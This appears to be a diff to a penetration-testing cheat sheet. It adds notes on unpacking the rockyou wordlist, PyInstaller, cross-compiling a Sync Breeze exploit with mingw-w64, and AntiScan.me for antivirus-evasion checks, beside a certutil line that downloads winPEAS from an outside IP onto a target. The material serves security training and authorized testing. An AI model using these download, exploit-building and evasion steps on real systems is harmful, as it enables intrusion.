@@ -296,4 +296,23 @@ certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe
 unzip file.zip
 7z x file.zip
 tar -xzvf file.tar.gz
+sudo gzip -d rockyou.txt.gz
 ```
+
+#### PyInstaller
+
+If Python is not installed on a target system, and you don't know how to write C code for the function that you want to do, you can use PyInstaller in order to turn a Python script into an executable that can be run on the target system.
+
+#### Cross-Compiling Code
+
+If you need to compile code for a Windows exploit, and the only machine that you have access to is your Kali machine, you can use **mingw-w64** to compile the code into a Windows Portable Executable (PE) file.
+```bash
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+
+# Google the error if it doesn't work, in this case, modify as follows
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+```
+
+#### AntiScan.me
+
+This service scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties.
